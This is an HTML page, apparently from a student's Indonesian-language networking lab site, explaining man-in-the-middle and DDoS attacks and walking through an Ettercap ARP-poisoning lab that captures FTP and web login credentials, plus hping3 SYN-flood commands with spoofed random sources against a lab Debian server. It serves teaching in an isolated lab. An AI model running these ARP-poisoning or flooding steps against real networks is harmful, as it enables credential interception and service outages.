@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MITM & DDOS</title>
+    <link rel="stylesheet" href="/assets/css/dhcp.css">
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="header">
+                <div class="judul">
+                    <h1>MITM, DDOS</h1>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="navigation">
+                <h1>Dokumentasi</h1>
+            </div>
+        </div>
+        <div class="row">
+            <div class="sidebar">
+                <h1>Debian 10</h1>
+                <ul>
+                    <li><a href="/blog/debian/index-debian.html">Home Debian</a></li>
+                    <li><a href="/blog/debian/dhcp.html">Superlab-DHCP Server</a></li>
+                    <li><a href="/blog/debian/ssh.html">Superlab-SSH</a></li>
+                    <li><a href="/blog/debian/dns.html">Superlab-DNS Server</a></li>
+                    <li><a href="/blog/debian/ftp.html">Superlab-FTP Server</a></li>
+                    <li><a href="/blog/debian/apache.html">Superlab-Web Server</a></li>
+                    <li><a href="/blog/debian/wordpress.html">Superlab-Wordpress</a></li>
+                    <li><a href="/blog/debian/phpmyadmin.html">Superlab-PhpMyAdmin</a></li>
+                </ul>
+                <h1>Mikrotik</h1>
+                <ul>
+                    <li><a href="/blog/mikrotik/index-mikrotik.html">Home Mikrotik</a></li>
+                    <li><a href="/blog/mikrotik/basic.html">Basic Config</a></li>
+                    <li><a href="/blog/mikrotik/vlan.html">VLAN</a></li>
+                    <li><a href="/blog/mikrotik/static.html">Routing Static</a></li>
+                    <li><a href="/blog/mikrotik/dynamic.html">Routing Dynamic</a></li>
+                    <li><a href="/blog/mikrotik/hotspot.html">Hotspot Login</a></li>
+                    <li><a href="/blog/mikrotik/blok.html">Blok SSH, Telnet, HTTP</a></li>
+                    <li><a href="/blog/mikrotik/bandwidth.html">Bandwidth</a></li>
+                    <li><a href="/blog/mikrotik/load-balancing.html">Load Balanding</a></li>
+                    <li><a href="/blog/mikrotik/bridge.html">Bridge</a></li>
+                </ul>
+                <h1>AWS Cloud</h1>
+                <ul>
+                    <li><a href="/blog/aws/index-cloud.html">Home Cloud</a></li>
+                    <li><a href="/blog/aws/cpanel.html">Install cPanel</a></li>
+                    <li><a href="/blog/aws/aws-wordpress.html">Install Wordpress</a></li>
+                    <li><a href="/blog/aws/nginx.html">Install NginX</a></li>
+                    <li><a href="/blog/aws/zabbix.html">Install Zabbix & Database</a></li>
+                </ul>
+                <h1>Security</h1>
+                <ul>
+                    <li><a href="/blog/security/index-security.html">Home Security</a></li>
+                    <li><a href="/blog/security/install.html">Installasi</a></li>
+                    <li><a href="/blog/security/iptables.html">IP Tables</a></li>
+                    <li><a href="/blog/security/cracklib.html">Craklib</a></li>
+                    <li><a href="/blog/security/port.html">Port Forwarding</a></li>
+                    <li><a href="/blog/security/hack.html">MITM&DDOS</a></li>
+                    <li><a href="/blog/security/snort.html">Snort</a></li>
+                    <li><a href="/blog/security/otp.html">Generated OTP</a></li>
+                </ul>
+            </div>
+            <div class="content">
+                <h1>Pengertian</h1>
+                <h2>Man In The Middle</h2>
+                <img src="img/top-mitm.png" alt="" class="top-mitm">
+                <p>Man in the Middle Attack (MITM) adalah jenis serangan keamanan di mana seorang penyerang menyusup dan memanipulasi komunikasi antara dua pihak yang seharusnya saling tepercaya. Penyerang ini dapat memata-matai, mengubah, atau bahkan menyuntikkan data ke dalam komunikasi yang berlangsung tanpa diketahui oleh pengguna yang terlibat.</p>
+                <p>Serangan Man in the Middle memiliki potensi bahaya yang besar karena dapat menyebabkan pencurian informasi pribadi, seperti kata sandi, informasi keuangan, atau data sensitif lainnya. Selain itu, penyerang dapat memanipulasi komunikasi untuk merugikan salah satu atau kedua pihak yang terlibat.</p>
+                <p>Man in the Middle Attack dapat terjadi melalui berbagai teknik, tetapi pada dasarnya, penyerang menempatkan dirinya di antara komunikasi yang seharusnya aman. Ini dapat dilakukan dengan memanfaatkan celah keamanan atau menggunakan teknik tertentu yang akan kita bahas berikutnya.</p>
+
+                <h2>Distributed Denial of Service</h2>
+                <img src="img/top-ddos.jpg" alt="" class="top-ddos">
+                <p>DDOS attack atau Distributed Denial of Service merupakan serangan cyber dengan cara mengirimkan fake traffic atau lalu lintas palsu ke suatu sistem atau server secara terus menerus. Dampaknya, server tersebut tidak dapat mengatur seluruh traffic sehingga menyebabkan down.</p>
+                <p>Umumnya serangan ini menyasar jaringan, layanan online, hingga website, dengan tujuan agar server tersebut tidak dapat mengakomodasi traffic atau lalu lintas sehingga website mengalami down dan tidak dapat beroperasi. Tak hanya menargetkan perseorangan atau perusahaan tertentu, serangan ini juga bisa menyasar sektor lebih tinggi seperti sektor pemerintahan.</p>
+                <p>Dalam prakteknya agar dapat menyerang suatu server, DDOS akan mengerahkan host dalam jumlah besar. Namun host yang dikerahkan tersebut adalah palsu, selanjutnya para hacker akan membanjiri lalu lintas server dengan host palsu tersebut. Sehingga ketika server berhasil dibanjiri oleh traffic hacker, dampaknya server akan lebih sulit diakses oleh host atau pengguna nyata.</p>
+
+                <h1>Konfigurasi</h1>
+                <h2>1. Man In The Middle</h2>
+                
+                <h2>Melihat Tabel ARP sebelum proses poisioning</h2>
+                <p>Melihat Tabel ARP sebelum proses poisioning. ARP(Address Resolution Protocol) adalah protokol yang digunakan untuk menerjemah alamat IP menjadi alamat MAC pada Local Area Network. Sebuah host akan mengirimkan ARP request secara broadcast untuk mendapatkan alamat MAC host tujuan.</p>
+                <h2 class="h2-wp">Windows- Client</h2>
+                <p>Ketik:  <strong>arp –a</strong> pada Windows- Client melalui cmd. <br>
+                    (catat hasil arp  berupa ip address dan mac address dari Debian 10- Router )</p>
+                <pre><mark>11.1.25.254          00-0c-29-2e-cd-6d</mark></pre>
+
+                <h2 class="h2-wp">Debian 10- Router</h2>
+                <p>Ketik: <stong>arp –a</stong> pada Debian 10- Router <br> 
+                    (catat hasil arp  berupa ip address dan mac address dari Windows- Client )</p>
+                <pre><mark>11.1.25.2              00:0c:29:f5:1e:f6</mark></pre>
+
+                <h2 class="h2-wp">KaliLinux</h2>
+                <p>Ketik: <stong>arp –a</stong> pada Kali Linux <br> 
+                    (catat hasil arp  berupa ip address dan mac address dari Windows- Client& Debian 10- Router )</p>
+<pre><mark>
+11.1.25.2               00:0c:29:f5:1e:f6 (Windows)
+11.1.25.254           00:0c:29:2e:cd:6d (Router)
+</pre></mark>
+
+                <h1>ARP Poisioning</h1>
+                <p>Selanjutnya kita akan melakukan Man In Midle Attack melalui Kalilinux</p>
+                <div class="daging">
+<p style="color: white; font-size: 15px;">
+Pada kalilinux, pilih <mark>application>sniffing&spoofing>ettercap-graphical </mark> <br><br>
+
+Pada ethercap pilih tab menu : <br>
+Sniff>unifield sniffing.. <br><br>
+
+pada ettercap primary interfaces pilih: <br>
+eth0 <br><br>
+
+Pilih tab menu host: <br>
+Scan for host <br><br>
+
+Pada host list, terdapat 2 alamat ip dan mac address hasil scan <br><br>
+<img src="img/arp1.png" alt="" class="arp1"> <br><br>
+
+a. Klik untuk pilih ip computer target dan klik add to target 1 (memasukan pc target yaitu Windows kedalam target1.) <br>
+b. Klik untuk pilih ip computer router dan klik add to target 2 (memasukan pc router kedalam target2) <br><br>
+
+Pilih tab menu <mark>MITM >ARP Poisioning</mark> <br>
+Pada optimal parameter pilih <br>
+Beri tanda check pada “sniff remote connection” <br><br>
+
+<img src="img/arp2.png" alt="" class="arp2">
+
+</p>
+                </div>
+                <h2>Melihat Tabel ARP setelah proses poisioning</h2>
+                <h2 class="h2-wp">Windows- Client</h2>
+                <p>Ketik:  <strong>arp –a</strong> pada Windows- Client melalui cmd. <br>
+                    (catat hasil arp  berupa ip address dan mac address dari Debian 10- Router )</p>
+                <pre><mark>11.1.25.254         00-0c-29-be-b6-b6</mark></pre>
+
+                <h2 class="h2-wp">Debian 10- Router</h2>
+                <p>Ketik: <stong>arp –a</stong> pada Debian 10- Router <br> 
+                    (catat hasil arp  berupa ip address dan mac address dari Windows- Client )</p>
+                <pre><mark>11.1.25.2            00:0c:29:be:b6:b6</mark></pre>
+
+                <h2 class="h2-wp">KaliLinux</h2>
+                <p>Ketik: <stong>arp –a</stong> pada Kali Linux <br> 
+                    (catat hasil arp  berupa ip address dan mac address dari Windows- Client& Debian 10- Router )</p>
+<pre><mark>
+11.1.25.2               00:0c:29:f5:1e:f6 (Windows)
+11.1.25.254           00:0c:29:2e:cd:6d (Router)
+</pre></mark>
+                <h2 class="h2-wp">Penjelasan</h2>
+                <p>Sebelum proses ARP, Windows- Client memberikan semua informasi kepada Mac Address Router <br>
+                    Tetapi setelah proses ARP dilakukan, Windows- Client memberikan informasi kepada Mac Address KaliLinux baru setelah itu KaliLinux akan meneruskan informasi tersebut kepada Router. <br><br>
+                    
+                    Jadi, KaliLinux akan mendapatkan semua informasi dari Windows- Client
+                    </p>
+                <h2>Pengujian ARP</h2>
+                <h2 class="h2-wp">FTP</h2>
+                <p>Pengujian password FTP Dari Windows- Client , coba lakukan FTP ke router melalui perintah pada cmd</p>
+                <div class="daging">
+<pre>
+ftp 11.1.25.254
+username : rizwan1
+password : 123
+
+<img src="img/arp-ftp1.png" alt="" class="arp-ftp1">
+</pre>
+                </div>
+                <p>Pada Kali Linux lihat pada ethercap username password FTP yang terekam.</p>
+                <img src="img/arp-ftp2.png" alt="" class="arp-ftp2">
+                <h2 class="h2-wp">Web HTTP</h2>
+                <p>Pengujian password Web Server/HTTP server dari Windows- Client dengan cara browsing database .php untuk pengetesan bisa ke website <a href="http://testphp.vulnweb.com/login.php"><u>http://testphp.vulnweb.com/login.php</u></a></p>
+                <div class="daging">
+<pre>
+username : rizwan1
+password : rizwanpemula
+</pre>
+                </div>
+                <p>Pada Kali Linux lihat pada ethercap username password .php yang terekam.</p>
+                <img src="img/arp-http.png" alt="" class="arp-http">
+
+                <h2>2. Distributed Denial Of Service</h2>
+                <h2 class="h2-wp">Debian 10- Server</h2>
+                <p>Kali ini kita ganti Interfaces Network untuk <strong>Debian 10- Server</strong> menjadi NAT atau Bridge. Ini artinya dia akan mendapatkan IP Internet yang satu segment dengan Router, yaitu : 192.168.91.0/24</p>
+                <h2 class="h2-wp">Package</h2>
+                    <ul>
+                        <li>net-tools</li>
+                        <li>iptables-persistent</li>
+                        <li>netfilter-persistent</li>
+                        <li>apache2</li>
+                        <li>proftpd</li>
+                        <li>libpam-cracklib</li>
+                        <li>tshark (new)</li>
+                    </ul>
+                <img src="img/top-hack.png" alt="" class="top-hack">
+                <p>Masuk ke <strong>Debian 10- Server</strong> lalu install package <mark>tshark</mark></p>
+                <div class="daging">
+<pre>
+apt install tshark
+
+non super user be able capture paket ? no
+</pre>
+                </div>
+                <p>tshark adalah alat penganalisis protokol berbasis baris perintah yang digunakan untuk menangkap dan menganalisis lalu lintas jaringan dari jaringan langsung. </p>
+                <p>Selanjutnya kita bisa jalankan tshark ini dengan command</p>
+                <div class="daging">
+<pre>
+tshark
+</pre>
+                </div>
+                <p>Lalu kita buka <mark>Windows- Client</mark> gunakan browser untuk buka web server milik Debian 10- Server</p>
+                <img src="img/cek-tshark1.png" alt="" class="cek-tshark1">
+                <p>Buka KaliLinux lalu ketik command</p>
+                <div class="daging">
+<pre>
+hping3 -S --flood -V -p 80 (IP Debian 10- Server)
+
+hping3 -S --flood -V -p 80 192.168.91.130
+</pre>
+                </div>
+                <p>Lalu di Kali Linux buka cmd yang baru untuk melancarkan aksi DDOS secara bersamaan</p>
+                <div class="daging">
+<p style="color: white; font-size: 15px;">
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source (IP Debian 10- Server) <br><br>
+
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.91.130
+</p>
+                </div> <br>
+                <img src="img/ddos.png" alt="" class="ddos">
+                <p>Lalu kita tunggu saja hingga Service Web Server dari Debian 10- Server itu down</p> <br>
+                <img src="img/cek-tshark2.png" alt="" class="cek-tshark2">
+            </div>
+        </div>
+        <div class="row">
+            <div class="footer">
+                <h1>Created By : Rizwan Fairuz Mamduh</h1>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
